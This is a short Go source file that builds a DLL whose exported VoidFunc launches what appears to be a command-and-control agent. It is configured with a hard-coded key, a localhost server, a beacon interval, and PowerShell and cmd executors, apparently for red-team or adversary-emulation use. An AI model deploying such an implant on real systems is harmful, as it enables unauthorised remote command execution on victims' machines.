package main

import "C"
import (
	"../core"
)

var (
	key = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
	defaultServer = "http://localhost:8888"
	defaultGroup = "my_group"
	defaultSleep = "60"
	defaultExeName = "shared.dll"
)

//export VoidFunc
func VoidFunc() {
	core.Core(defaultServer, defaultGroup, defaultSleep, 0, defaultExeName, []string{"psh","cmd"}, false)
}

func main() {}
